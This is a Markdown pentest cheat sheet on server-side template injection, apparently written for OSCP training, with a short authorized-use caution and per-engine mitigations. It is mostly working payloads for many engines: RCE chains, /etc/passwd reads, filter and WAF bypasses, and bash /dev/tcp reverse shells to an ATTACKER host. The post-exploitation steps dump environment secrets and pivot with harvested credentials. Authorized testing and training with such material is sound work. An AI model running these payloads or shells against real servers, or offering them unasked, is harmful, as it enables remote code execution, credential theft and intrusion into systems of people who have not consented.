# SSTI (Server-Side Template Injection)

> Server-Side Template Injection occurs when user input is concatenated into a template and evaluated by the template engine. Depending on the engine and sandbox, SSTI can lead to information disclosure, file read, or full remote code execution (RCE). SSTI is a high-severity finding and a frequent OSCP and HTB topic.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Enumeration](#4-enumeration)
- [5. Attack Surface Map](#5-attack-surface-map)
- [6. Exploitation by Engine](#6-exploitation-by-engine)
- [7. Common Payloads](#7-common-payloads)
- [8. Filter Bypass](#8-filter-bypass)
- [9. Tools](#9-tools)
- [10. Post-Exploitation](#10-post-exploitation)
- [11. OSCP Notes](#11-oscp-notes)
- [12. Cheatsheet](#12-cheatsheet)
- [13. References](#13-references)

---

## 1. Overview

SSTI = template engine evaluates user input as template code instead of
treating it as data.

**Common engines:**

| Engine | Language | Syntax | Notes |
|--------|----------|--------|-------|
| Jinja2 | Python (Flask, Django) | `{{...}}` `{%...%}` | Most common on OSCP |
| Twig | PHP (Symfony) | `{{...}}` `{%...%}` | Second most common |
| Freemarker | Java | `${...}` `<#...>` | Spring, Java apps |
| ERB | Ruby (Rails) | `<%= ... %>` | Direct Ruby eval |
| Smarty | PHP | `{}` `{if}` | Legacy PHP |
| Mako | Python | `${...}` `<%...%>` | Pyramid, older Python |
| Pebble | Java | `{{...}}` `{%...%}` | Spring alternatives |
| Velocity | Java | `#if` `#set` | Older Java apps |
| Handlebars / Nunjucks | Node.js | `{{...}}` | Often logic-less |
| EJS | Node.js | `<%= ... %>` | Express views |
| Thymeleaf | Java (Spring) | `*{...}` `[[${...}]]` | Spring MVC |
| Razor | .NET | `@{...}` `@(...)` | ASP.NET |

**Impact:**

- Info disclosure (config, env vars).
- File read.
- Command execution.
- Reverse shell.

**On OSCP:** SSTI is a strong foothold. Detection is fast (`{{7*7}}` -> 49),
and Jinja2/Twig payloads usually give RCE in minutes.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Math probe (`{{7*7}}`) | [PROD-RISK] |
| Info disclosure (config, env) | [PROD-RISK] |
| File read | [PROD-NO] |
| Command execution (`id`, `whoami`) | [PROD-NO] |
| Reverse shell | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT execute destructive commands.
- Do NOT open reverse shells without approval.
- Do NOT read secrets (env vars, DB creds) unless in scope.
- Do NOT leave injected templates persistent (some apps cache them).

In production, prove SSTI with a math probe and stop.

### 2.3 Rate limiting

SSTI probes are individual requests. Do not fuzz aggressively in production.

---

## 3. Detection

### 3.1 Basic probes

Send a math expression in a template tag:

```bash
curl 'http://target/hello?name={{7*7}}'
curl 'http://target/hello?name=${7*7}'
curl 'http://target/hello?name=<%= 7*7 %>'
```

**Expected output (if vulnerable):**

```text
Hello 49
```

If you see `49` instead of the literal `{{7*7}}`, the input is rendered.

### 3.2 Polyglot probe

The PortSwigger polyglot triggers errors in most engines and reveals
which one is in use:

```text
${{<%[%'"}}%\
```

URL-encode and send:

```bash
curl 'http://target/hello?name=%24%7B%3C%25%5B%25%27%22%7D%7D%25%5C'
```

Read the error message to identify the engine (e.g. `jinja2.exceptions`,
`Twig\Error\SyntaxError`, `freemarker.core.ParseException`).

### 3.3 Identification tree

| Probe | Result | Engine |
|-------|--------|--------|
| `{{7*7}}` | 49 | Jinja2 / Twig / Pebble / Nunjucks |
| `{{7*'7'}}` | 7777777 | Jinja2 (string repeat) |
| `{{7*'7'}}` | 49 | Twig (numeric coercion) |
| `${7*7}` | 49 | Freemarker / Mako / Velocity |
| `<%= 7*7 %>` | 49 | ERB (Ruby), EJS (Node.js) |
| `#{7*7}` | 49 | Ruby (some contexts) |
| `@{7*7}` | 49 | Razor (.NET) |
| `*{7*7}` | 49 | Thymeleaf (preprocessing) |
| `[[${7*7}]]` | 49 | Thymeleaf |

**Narrowing Jinja2 vs Twig:**

```text
{{7*'7'}}   Jinja2: 7777777   Twig: 49
{{config}}  Jinja2: leaks Flask config   Twig: error
```

### 3.4 Fingerprinting

#### Arithmetic differential

| Payload | Jinja2 | Twig | Freemarker | Velocity | Smarty | ERB |
|---------|--------|------|------------|----------|--------|-----|
| `{{7*7}}` | 49 | 49 | | | | |
| `{{7*'7'}}` | 7777777 | 49 | | | | |
| `${7*7}` | | | 49 | | | |
| `#{7*7}` | | | | | 49 (legacy) | |
| `<%= 7*7 %>` | | | | | | 49 |
| `*{7*7}` | | | | | | |

Key distinguishers:

- `{{7*'7'}}` returns `7777777` (Jinja2) or `49` (Twig).
- `${7*7}` returns `49` (Freemarker) or `0` (Velocity, because `${7*7}` is not defined).

#### Engine-specific markers

| Engine | Marker |
|--------|--------|
| Jinja2 | `{{config}}`, `{{self}}`, `{{''.__class__}}` |
| Twig | `{{_self}}`, `{{dump()}}` (if debug) |
| Freemarker | `${.version}`, `<#assign x=1>` |
| Velocity | `#set($x=7*7)$x` |
| Smarty | `{$smarty.version}`, `{php}...{/php}` (legacy) |
| ERB | `<%= RUBY_VERSION %>` |
| EJS | `<%= process.version %>` |
| Thymeleaf | `[[${7*7}]]`, `__${7*7}__` |
| Razor | `@{7*7}`, `@(7*7)` |

#### Error-based detection

Malformed payloads often reveal the engine:

```text
{{7*7
<%
${7*7}
{{7*7}}
```

Errors like `jinja2.exceptions.TemplateSyntaxError`, `Twig_Error_Syntax`,
`freemarker.core.ParseException` are direct proof.

### 3.5 Quick reference table

| Payload | Engine hint |
|---------|-------------|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars |
| `${7*7}` | Freemarker, Thymeleaf, JSP EL |
| `#{7*7}` | Ruby (ERB), Thymeleaf |
| `<%= 7*7 %>` | ERB, EJS, JSP |
| `{7*7}` | Smarty (legacy) |
| `${{7*7}}` | Smarty (modern) |
| `@{7*7}` | Razor (.NET) |
| `*{7*7}` | Thymeleaf (preprocessing) |

---

## 4. Enumeration

### 4.1 Context matters

- **Reflected:** the payload is echoed in the response.
- **Stored:** the payload is saved and rendered later (e.g. profile bio).
- **Blind:** the payload executes but output is not returned. Use timing or OOB.

### 4.2 Fuzz entry points

```bash
# Basic fuzz with a payload list
ffuf -u "$TARGET/?name=FUZZ" -w ssti-payloads.txt -mr "49"

# ssti-payloads.txt (one payload per line):
# ${{7*7}}
# {{7*7}}
# ${7*7}
# #{7*7}
# <%= 7*7 %>
```

### 4.3 Field-by-field

For each user-controlled field, test in isolation. Fields often visible to
other users (comments, usernames) are the highest value.

### 4.4 Content-Type matters

Some engines only trigger on certain content types (e.g. email templates
rendered as HTML). Test JSON, form-encoded, and XML bodies.

---

## 5. Attack Surface Map

| Attack | Condition | Impact |
|--------|-----------|--------|
| Info disclosure | `{{config}}`, `${.version}` | Secrets leak |
| File read | Jinja2 `__class__` chain | `/etc/passwd` |
| RCE | `__builtins__` access | Full compromise |
| Blind SSTI | No reflected output | OOB DNS/HTTP |
| Sandbox escape | Jinja2 sandbox, Twig sandbox | RCE |
| Client-side confusion | Angular/Vue markers | No server impact |
| DoS | Infinite loop in template | Server hang |

---

## 6. Exploitation by Engine

### 6.1 Jinja2 (Python/Flask)

**Root cause:** User input passed to `render_template_string` or `Template(...).render()`.

**Info disclosure:**

```jinja2
{{ config }}
{{ config.items() }}
{{ request.application.__globals__ }}
{{ self.__init__.__globals__.__builtins__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**File read:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

Or the classic `cycler` / `lipsum` chain (does not require subclass index):

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

**Command execution:**

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

**Reverse shell:**

```jinja2
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read() }}
```

> [!IMPORTANT]
> OSCP report: screenshot the SSTI probe (`{{7*7}}` -> 49), the config leak or file read, and the RCE (`id` output or reverse shell). Include the payload used.

**Mitigation:** never concatenate user input into templates; use `render_template` with static files; use the sandbox (`jinja2.sandbox.SandboxedEnvironment`) and audit.

---

### 6.2 Twig (PHP/Symfony)

**Info disclosure:**

```twig
{{ _self }}
{{ _self.env }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

**Command execution (Twig < 1.20 / legacy):**

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

**Command execution (Twig 2.x / 3.x, filter chain):**

```twig
{{ ['id'] | filter('system') }}
{{ ['id',0] | sort('system') | join }}
{{ ['id'] | map('system') | join }}
```

**Reverse shell:**

```twig
{{ ['bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'] | filter('system') }}
```

> [!IMPORTANT]
> OSCP report: screenshot `{{7*7}}` -> 49, the `_self.env` leak, and the RCE (command output).

**Mitigation:** use Twig sandbox; never allow user input as template; validate allowed tags.

---

### 6.3 Freemarker (Java)

**Info disclosure:**

```freemarker
${.version}
${.data_model}
${.globals}
```

**Command execution via `?new()` (Freemarker < 2.3.30 or with `api_builtin_enabled=true`):**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**File read via `ObjectConstructor`:**

```freemarker
<#assign is= "freemarker.template.utility.ObjectConstructor"?new()>
<#assign br= is("java.io.BufferedReader", is("java.io.FileReader", "/etc/passwd"))>
${br.readLine()}
```

**Reverse shell:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")}
```

> [!IMPORTANT]
> OSCP report: screenshot the `${7*7}` probe, the `.version` leak, and the `${ex("id")}` RCE.

**Mitigation:** disable `?new()` and `api_builtin_enabled`; sanitize user input; use FreeMarker's `TemplateClassResolver`.

---

### 6.4 ERB (Ruby)

**Info disclosure:**

```erb
<%= RUBY_VERSION %>
<%= system('id') %>
<%= `id` %>
```

**Command execution:**

```erb
<%= system('id') %>
<%= IO.popen('id').read %>
```

**Reverse shell:**

```erb
<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'` %>
```

> [!IMPORTANT]
> OSCP report: screenshot the ERB probe (`<%= 7*7 %>` -> 49) and the command output.

**Mitigation:** never render user input with ERB; use `ERB::Util.html_escape`.

---

### 6.5 Velocity (Java)

**Info disclosure / RCE:**

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

Simpler variants exist when `$class` is accessible.

> [!IMPORTANT]
> OSCP report: screenshot the payload and the command output.

**Mitigation:** disable Velocity's class access; do not expose to untrusted input.

---

### 6.6 Smarty (PHP)

**Legacy (`{php}`):**

```smarty
{php}echo shell_exec('id');{/php}
```

**Modern (`${{...}}`):**

```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru('id'); ?>",self::clearConfig())}
```

Or via `{system('id')}` if the `system` function is registered.

> [!IMPORTANT]
> OSCP report: screenshot the payload and the RCE proof.

**Mitigation:** disable `{php}` in Smarty config; whitelist allowed modifiers; never allow user input as template.

---

### 6.7 EJS (Node.js)

**Info disclosure:**

```ejs
<%= process.version %>
<%= process.env %>
<%= require('child_process').execSync('id').toString() %>
```

**RCE (via `settings['view options']` or `locals`):**

```ejs
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

> [!IMPORTANT]
> OSCP report: screenshot `<%= 7*7 %>` -> 49 and the RCE output.

**Mitigation:** never pass user input to `ejs.render`; use static templates.

---

### 6.8 Thymeleaf (Spring)

**Info disclosure:**

```thymeleaf
[[${7*7}]]
[[${application}]]
[[${T(java.lang.Runtime).getRuntime()}]]
```

**RCE:**

```thymeleaf
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

**Preprocessing (only in certain contexts):**

```thymeleaf
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

> [!IMPORTANT]
> OSCP report: screenshot the `[[${7*7}]]` probe, the `T(java.lang.Runtime)` payload, and the RCE proof.

**Mitigation:** never return user input as a Thymeleaf fragment; use `th:text`, not `th:utext`; whitelist template expressions.

---

### 6.9 Handlebars (Node.js)

Handlebars escapes by default; SSTI is rare. But if a helper like `lookup`
or `with` is misused, you can access properties.

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (string.sub.apply 0 this)}}{{this}}{{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

Handlebars SSTI with `Function` constructor is possible when
`runtimeOptions` is controlled.

> [!IMPORTANT]
> OSCP report: screenshot the payload and the resulting access.

**Mitigation:** never compile user input; keep helpers whitelisted.

---

### 6.10 Mako / Pebble / Nunjucks

| Engine | Basic RCE |
|--------|-----------|
| Mako (Python) | `${self.module.cache.util.os.popen('id').read()}` |
| Pebble (Java) | `{% set cmd = 'id' %}{{ cmd }}` with reflection chain (see PayloadsAllTheThings) |
| Nunjucks (Node.js) | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` |

Full payloads per engine: see PayloadsAllTheThings (section 13).

---

### 6.11 Blind SSTI

When output is not reflected, use out-of-band (OOB) channels:

- DNS: `{{ cycler.__init__.__globals__.os.popen('nslookup ATTACKER').read() }}` (Jinja2).
- HTTP: curl to attacker.
- Time-based: `{{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}` - response delayed by 5s.

> [!IMPORTANT]
> OSCP report: screenshot the OOB callback (Burp Collaborator, interact.sh) or the response time delta.

---

### 6.12 Client-side false positives

Angular, Vue, and React use `{{...}}` or `{...}` in templates but do not
execute on the server. Confirm:

- `{{7*7}}` renders in the browser but not in `curl` output -> client-side.
- Check `View Source` and DevTools Network response.

---

## 7. Common Payloads

### 7.1 File read

```jinja2
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

```twig
{{ source('/etc/passwd') }}
```

### 7.2 Command execution

See section 6 (per engine).

### 7.3 Reverse shell

Use one of the OS-specific reverse shells from
[Command-Injection.md](./Command-Injection.md) section 4.4, wrapped in the
engine-specific RCE.

---

## 8. Filter Bypass

### 8.1 General strategies

If `{{`, `_`, `.`, `[]`, keywords (`class`, `system`, `os`) are filtered:

- **Underscore bypass (Jinja2):** use hex `\x5f\x5f` or octal `\137\137`.
- **Dot bypass (Jinja2):** use `|attr('name')` instead of `.name`.
- **Bracket bypass (Jinja2):** use `|attr()` and `|map()`.
- **Keyword bypass:** encode as hex, then `decode()` at runtime.
- **Alternative blocks:** `{%...%}` if `{{...}}` is blocked.

### 8.2 Jinja2 bypass examples

**Without `.`:**

```jinja2
{{ request|attr('application')|attr('__globals__') }}
```

**Without `_` and `.` and `[]`:**

```jinja2
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

### 8.3 Twig bypass examples

**Without `_self`:**

```twig
{{ ['id'] | filter('system') }}
{{ ['id'] | map('system') | join }}
```

### 8.4 WAF

See [WAF-Detection.md](../01%20Recon/WAF-Detection.md) section 6 for encoding
strategies. SSTI-specific triggers are `{{`, `}}`, `${`, `<%`, `%>`.

---

## 9. Tools

| Tool | Purpose |
|------|---------|
| SSTImap | Automatic SSTI exploitation (active fork) |
| tplmap | Classic SSTI tool (2017, less maintained) |
| Burp Suite | Manual testing |
| PayloadsAllTheThings | Engine-specific payloads |

Examples:

```bash
# SSTImap
python3 sstimap.py -u 'http://target/hello?name=INJECT'
python3 sstimap.py -u 'http://target/hello?name=INJECT' --os-shell

# tplmap
python2 tplmap.py -u 'http://target/hello?name=INJECT'
```

Manual fuzzing:

```bash
cat > ssti.txt <<'EOF'
${{7*7}}
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
@{7*7}
*{7*7}
[[${7*7}]]
${{7*'7'}}
{{7*'7'}}
EOF

ffuf -u "$TARGET/?name=FUZZ" -w ssti.txt -mr "49|7777777"
```

PayloadsAllTheThings:

```bash
curl -s https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/README.md
```

---

## 10. Post-Exploitation

After RCE:

1. **Establish a reverse shell:** `bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"`.
2. **Enumerate the host:** `id`, `hostname`, `uname -a`, `cat /etc/passwd`.
3. **Find secrets in env:** `env`, `cat /proc/self/environ`.
4. **Check the app config:** Flask `config`, Spring `application.properties`.
5. **Read DB credentials:** often in env or config files.
6. **Pivot:** if the app talks to a database or internal service, use the app's credentials.

```jinja2
{{ cycler.__init__.__globals__.os.popen('env').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /proc/self/environ').read() }}
{{ cycler.__init__.__globals__.os.popen('find / -name "*.env" 2>/dev/null').read() }}
```

---

## 11. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for SSTI:
> - Screenshot the math probe ({{7*7}} -> 49) BEFORE exploitation.
> - Screenshot the engine identification.
> - Screenshot the RCE (id / whoami).
> - Screenshot the reverse shell if used.
> - For blind SSTI, screenshot the OOB callback with timestamp.
> - Include timestamps in every screenshot.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

> [!IMPORTANT]
> Start with SAFE probes (`{{7*7}}`). Only escalate to RCE after confirming
> SSTI. For each engine, use the LEAST intrusive payload that proves the finding.

> [!IMPORTANT]
> For Jinja2, the `cycler`/`lipsum`/`joiner`/`namespace` chain is more stable
> than subclass indexing (`__subclasses__()[N]`) - the index varies across
> Python versions.

**Common OSCP pitfalls:**

- `{{7*7}}` may be URL-encoded; some apps decode twice. Try `%7B%7B7*7%7D%7D`.
- Jinja2 `config` may be accessible in Flask only; other frameworks use different globals.
- Twig sandbox blocks many payloads; test filter chains (`|filter`, `|map`, `|sort`).
- Freemarker `<#assign>` might be filtered; try `${...?new()}` inline.
- Thymeleaf often needs a specific context (returning a fragment name); `[[${...}]]` may not always work.
- Distinguish client-side (Angular/Vue) from server-side: check `curl` output, not browser.
- For blind SSTI, use a Burp Collaborator or interact.sh subdomain.

---

## 12. Cheatsheet

```text
Probes:           {{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}
Jinja2/Twig ID:   {{7*'7'}}  Jinja2->7777777  Twig->49
Polyglot:         ${{<%[%'"}}%\
```

```jinja2
# Jinja2 RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

```twig
# Twig legacy RCE
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}

# Twig 2.x/3.x RCE
{{ ['id'] | filter('system') }}
```

```freemarker
# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

```erb
# ERB RCE
<%= system('id') %>
```

```thymeleaf
# Thymeleaf RCE
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

---

## 13. References

- PortSwigger SSTI - https://portswigger.net/web-security/server-side-template-injection
- HackTricks SSTI - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- PayloadsAllTheThings SSTI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Jinja2 sandbox docs - https://jinja.palletsprojects.com/en/3.1.x/sandbox/
- Twig security - https://twig.symfony.com/doc/3.x/api.html
- Freemarker security - https://freemarker.apache.org/docs/api/freemarker/core/Configurable.html
- Velocity security - https://velocity.apache.org/engine/2.3/user-guide.html
- Thymeleaf expression injection - https://github.com/thymeleaf/thymeleaf/issues/395
- tplmap - https://github.com/epinna/tplmap
- SSTImap - https://github.com/vladko312/SSTImap
- CVE-2022-22963 (Spring Cloud Function SpEL RCE) - https://nvd.nist.gov/vuln/detail/CVE-2022-22963
- CVE-2022-22965 (Spring4Shell) - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
- CVE-2019-11043 (PHP-FPM underflow, used with template RCE) - https://nvd.nist.gov/vuln/detail/CVE-2019-11043
- CVE-2021-41773 (Apache path traversal, sometimes chained) - https://nvd.nist.gov/vuln/detail/CVE-2021-41773

---

*Part of Bugterium. English only by design. Last updated: 2026-10-14.*

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [Command-Injection.md](./Command-Injection.md)
